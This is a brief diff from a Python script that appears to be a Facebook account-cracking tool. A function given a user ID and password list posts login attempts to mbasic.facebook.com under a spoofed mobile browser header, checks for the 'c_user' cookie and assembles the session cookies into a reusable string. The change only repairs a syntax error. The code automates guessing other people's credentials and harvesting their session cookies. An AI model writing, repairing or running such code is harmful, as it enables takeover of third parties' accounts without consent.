@@ -596,7 +596,7 @@ def rcerek(uid,pwx,tl):
     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
 }
-        	lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'',data=log_data,headers=header_freefb).text
+        	lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
         	log_cookies=session.cookies.get_dict().keys()
         	if 'c_user' in log_cookies:
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
